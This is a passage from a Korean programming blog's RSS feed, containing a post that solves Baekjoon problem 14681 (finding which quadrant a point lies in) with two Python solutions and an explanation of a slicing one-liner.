      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5543%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 14681번 문제</title>
      <link>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14681%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14681%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Wed, 30 Dec 2020 22:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;백준-14681번-문제&quot;&gt;&lt;a href=&quot;#백준-14681번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 14681번 문제&quot;&gt;&lt;/a&gt;백준 14681번 문제&lt;/h2&gt;&lt;h3 id=&quot;사분면-고르기&quot;&gt;&lt;a href=&quot;#사분면-고르</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="백준-14681번-문제"><a href="#백준-14681번-문제" class="headerlink" title="백준 14681번 문제"></a>백준 14681번 문제</h2><h3 id="사분면-고르기"><a href="#사분면-고르기" class="headerlink" title="사분면 고르기"></a>사분면 고르기</h3><h4 id="흔한-수학-문제-중-하나는-주어진-점이-어느-사분면에-속하는지-알아내는-것이다-사분면은-아래-그림처럼-1부터-4까지-번호를-갖는다-“Quadrant-n”은-“제n사분면”이라는-뜻이다"><a href="#흔한-수학-문제-중-하나는-주어진-점이-어느-사분면에-속하는지-알아내는-것이다-사분면은-아래-그림처럼-1부터-4까지-번호를-갖는다-“Quadrant-n”은-“제n사분면”이라는-뜻이다" class="headerlink" title="흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. “Quadrant n”은 “제n사분면”이라는 뜻이다."></a>흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. “Quadrant n”은 “제n사분면”이라는 뜻이다.</h4><p><img src="https://onlinejudgeimages.s3-ap-northeast-1.amazonaws.com/problem/14681/1.png"></p><h4 id="예를-들어-좌표가-12-5-인-점-A는-x좌표와-y좌표가-모두-양수이므로-제1사분면에-속한다-점-B는-x좌표가-음수이고-y좌표가-양수이므로-제2사분면에-속한다"><a href="#예를-들어-좌표가-12-5-인-점-A는-x좌표와-y좌표가-모두-양수이므로-제1사분면에-속한다-점-B는-x좌표가-음수이고-y좌표가-양수이므로-제2사분면에-속한다" class="headerlink" title="예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다."></a>예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.</h4><h4 id="점의-좌표를-입력받아-그-점이-어느-사분면에-속하는지-알아내는-프로그램을-작성하시오-단-x좌표와-y좌표는-모두-양수나-음수라고-가정한다"><a href="#점의-좌표를-입력받아-그-점이-어느-사분면에-속하는지-알아내는-프로그램을-작성하시오-단-x좌표와-y좌표는-모두-양수나-음수라고-가정한다" class="headerlink" title="점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다."></a>점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.</h4><p>Link : <a href="https://www.acmicpc.net/problem/2753">https://www.acmicpc.net/problem/2753</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a &gt;= <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> b &gt;= <span class="number">0</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> b &gt;=<span class="number">0</span>:</span><br><span class="line">        print(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>조건문을 왕창써서 해결한 코드이다.<br><br>좀 더 파이썬스럽게 변경하곘다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;3421&quot;</span>[<span class="built_in">input</span>()&gt;<span class="string">&quot;0&quot;</span>::<span class="number">2</span>][<span class="built_in">input</span>()&gt;<span class="string">&quot;0&quot;</span>])</span><br></pre></td></tr></table></figure><p>슬라이싱과 bool을 이용하여 수정하였다.<br><br>두 개의 설명은 9498번 문제와 1038번 문제를 보면 된다.<br><br>Link : <a href="https://lrtk-coder.github.io/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/">https://lrtk-coder.github.io/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/</a></p><p>코드를 설명하자면,<br><br><code>&quot;3421&quot;[input()&gt;&quot;0&quot;::2]</code>은 입력받은 값이 0보다 크면 True가 나온다.<br><br>파이썬에서 True는 1로 통한다. 그래서 파이썬에선 <code>::2</code>의 조건을 통해서 index 1의 자리와 3의 자리를 출력한다.<br><br>그 후, <code>[input()&gt;&quot;0&quot;]</code>을 통해 인덱스 0의 자리를 가져올지, 1의 자리를 가져올지를 결정한다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14681%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
